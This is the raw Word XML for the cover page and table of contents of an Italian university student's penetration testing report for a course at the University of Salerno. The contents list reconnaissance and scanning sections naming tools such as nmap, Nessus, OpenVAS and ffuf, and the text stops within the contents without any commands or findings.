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pic="http://schemas.openxmlformats.org/drawingml/2006/picture" xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" mc:Ignorable="w14 w15 w16se w16cid w16 w16cex w16sdtdh wp14">
  <w:body>
    <w:p w:rsidR="00D5413C" w:rsidRDefault="000C6762" w14:paraId="56BACAD2" w14:textId="77777777">
      <w:pPr>
        <w:pStyle w:val="Foto"/>
      </w:pPr>
      <w:r w:rsidRPr="00FC391B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4D84FE44" wp14:editId="021B62C1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>279128</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4610991" cy="4610991"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapNone/>
            <wp:docPr id="16" name="Picture 4" descr="Risultati immagini per logo unisa">
              <a:extLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B78403E-184D-43A6-84E9-CB7C0FFB3B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 descr="Risultati immagini per logo unisa">
                      <a:extLst>
                        <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                          <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B78403E-184D-43A6-84E9-CB7C0FFB3B0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alphaModFix amt="10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991" cy="46109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FC391B" w:rsidR="00CE488A">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
          <mc:Choice xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" Requires="wps">
            <w:drawing xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
              <wp:anchor xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660288" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6FA836BD" wp14:editId="2348EC72">
                <wp:simplePos xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" x="0" y="0"/>
                <wp:positionH xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" relativeFrom="column">
                  <wp:posOffset>215435</wp:posOffset>
                </wp:positionH>
                <wp:positionV xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" relativeFrom="paragraph">
                  <wp:posOffset>-635969</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3221588" cy="1293257"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapNone xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"/>
                <wp:docPr xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" id="25" name="CasellaDiTesto 24">
                  <a:extLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5FB8ECF8-2AE1-41A8-B1B0-457AEFA82AC2}"/>
                    </a:ext>
                  </a:extLst>
                </wp:docPr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3221588" cy="129325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Pr="00CE488A" w:rsidR="00836F13" w:rsidP="00FC391B" w:rsidRDefault="00836F13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 w:rsidRPr="00CE488A">
                              <w:rPr>
                                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="C3857F"/>
                                <w:kern w:val="24"/>
                                <w:sz w:val="56"/>
                                <w:szCs w:val="56"/>
                              </w:rPr>
                              <w:t>Università degli Studi di Salerno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 xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w:rsidRPr="00AF78EB" w:rsidR="001638F6" w:rsidP="00D5413C" w:rsidRDefault="00762ED1" w14:paraId="5703CC54" w14:textId="77777777">
      <w:pPr>
        <w:pStyle w:val="Titolo"/>
      </w:pPr>
      <w:r w:rsidR="17B81A7F">
        <w:rPr/>
        <w:t>Penetration</w:t>
      </w:r>
      <w:r w:rsidR="17B81A7F">
        <w:rPr/>
        <w:t xml:space="preserve"> Testing Report</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="505EE195" w:rsidP="21040C4D" w:rsidRDefault="505EE195" w14:paraId="05A4F8B3" w14:textId="68E69FAB">
      <w:pPr>
        <w:pStyle w:val="Sottotitolo"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="300" w:beforeAutospacing="off" w:after="40" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidR="505EE195">
        <w:rPr/>
        <w:t>Penetration</w:t>
      </w:r>
      <w:r w:rsidR="505EE195">
        <w:rPr/>
        <w:t xml:space="preserve"> TESTING </w:t>
      </w:r>
      <w:r w:rsidR="7F8F231A">
        <w:rPr/>
        <w:t>Narrative</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003422FF" w:rsidP="005D6A9F" w:rsidRDefault="005D6A9F" w14:paraId="102FF279" w14:textId="6CAE2059">
      <w:pPr>
        <w:pStyle w:val="Informazionicontat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FA39EAA" wp14:editId="030AC404">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-1143000</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>6514465</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="7727136" cy="433705"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapNone/>
                <wp:docPr id="4" name="Rettango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7136" cy="4337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tangolo 4" style="position:absolute;margin-left:-90pt;margin-top:512.95pt;width:608.45pt;height:34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bfbfbf [2412]" stroked="f" strokeweight="2pt" w14:anchorId="0CE8BE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"/>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="000C6762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0E8247" wp14:editId="7AA8B9CE">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-1155700</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>6491144</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="7683560" cy="0"/>
                <wp:effectExtent l="0" t="12700" r="25400" b="25400"/>
                <wp:wrapNone/>
                <wp:docPr id="14" name="Connettore diritto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B0A73805-120B-4F0D-BF81-4B8CDC667B6B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768356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AD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Connettore diritto 13" style="position:absolute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#ad0000" strokeweight="3pt" from="-91pt,511.1pt" to="514pt,511.1pt" w14:anchorId="275C0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">
                <o:lock v:ext="edit" shapetype="f"/>
              </v:line>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="727E78CD">
        <w:rPr/>
        <w:t>Antonio Allocca</w:t>
      </w:r>
      <w:r w:rsidR="4B4801F7">
        <w:rPr>
          <w:lang w:bidi="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:alias w:val="Corso:"/>
          <w:tag w:val="Corso:"/>
          <w:id w:val="-1824112714"/>
          <w:placeholder>
            <w:docPart w:val="4573BCD9F82842B59CB64A476EFD06A0"/>
          </w:placeholder>
          <w:temporary/>
          <w:showingPlcHdr/>
          <w15:appearance w15:val="hidden"/>
        </w:sdtPr>
        <w:sdtContent>
          <w:r w:rsidR="4B4801F7">
            <w:rPr>
              <w:lang w:bidi="it-IT"/>
            </w:rPr>
            <w:t>Corso</w:t>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="4B4801F7">
        <w:rPr/>
        <w:t xml:space="preserve"> di PTEH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="it-IT"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="35ED06C7" wp14:editId="6129CC58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274310" cy="1035050"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:wrapSquare wrapText="bothSides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4B4801F7">
        <w:rPr>
          <w:lang w:bidi="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidR="4B4801F7">
        <w:rPr/>
        <w:t>A.A. 20</w:t>
      </w:r>
      <w:r w:rsidR="3602438A">
        <w:rPr/>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="508A6EF6">
        <w:rPr/>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="4B4801F7">
        <w:rPr/>
        <w:t>/202</w:t>
      </w:r>
      <w:r w:rsidR="508A6EF6">
        <w:rPr/>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="003422FF">
        <w:rPr>
          <w:lang w:bidi="it-IT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:id w:val="195807617"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtContent>
        <w:p w:rsidR="004A3D0B" w:rsidRDefault="004A3D0B" w14:paraId="1A75B9BE" w14:textId="77777777">
          <w:pPr>
            <w:pStyle w:val="Titolosommario"/>
          </w:pPr>
          <w:r w:rsidR="687E2107">
            <w:rPr/>
            <w:t>Sommario</w:t>
          </w:r>
        </w:p>
        <w:p w:rsidR="00345496" w:rsidP="21040C4D" w:rsidRDefault="004A3D0B" w14:paraId="316360D3" w14:textId="2F128D19">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
              <w:noProof/>
              <w:lang w:eastAsia="it-IT"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r>
            <w:instrText xml:space="preserve">TOC \o "1-3" \z \u \h</w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc737474297">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Metodologia e strumenti utilizzati</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc737474297 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="7C1FCBC5" w14:textId="606453B7">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc526556734">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Informazioni preliminari</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc526556734 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="615EFF92" w14:textId="41BAF0B7">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1757609426">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Information gathering</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1757609426 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="66483EA6" w14:textId="2CA43E95">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc748779261">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Target Discovery</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc748779261 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="6224C466" w14:textId="7AA23AA0">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1246594115">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Ping</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1246594115 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="7E4B11E4" w14:textId="2911C1AB">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1552291499">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Nmap</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1552291499 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="69A80A32" w14:textId="1A346A12">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc906090048">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Enumerating Target e Port Scanning</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc906090048 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="594DE181" w14:textId="4458365C">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc377975825">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>nmap</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc377975825 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="444EAC8F" w14:textId="360B4717">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1515543624">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Vulenerability mapping</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1515543624 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="413A20DC" w14:textId="14098EC3">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc928991422">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Nessus</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc928991422 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="1E2399F9" w14:textId="1ABF59E7">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc879902358">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>OPENVas</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc879902358 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="1C8CA5C2" w14:textId="1A63312F">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1939481084">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Whateb</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1939481084 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="4F0ADDBC" w14:textId="39489804">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc1510582468">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>WAFW00f</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc1510582468 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="5F5D4A7B" w14:textId="17686E23">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc2133826468">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>ffuf</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc2133826468 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="7A0B7641" w14:textId="4125745B">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8295"/>
            </w:tabs>
            <w:rPr>
              <w:rStyle w:val="Collegamentoipertestuale"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc62393433">
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>Analisi manuale</w:t>
            </w:r>
            <w:r>
              <w:tab/>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:instrText xml:space="preserve">PAGEREF _Toc62393433 \h</w:instrText>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="21040C4D" w:rsidR="21040C4D">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
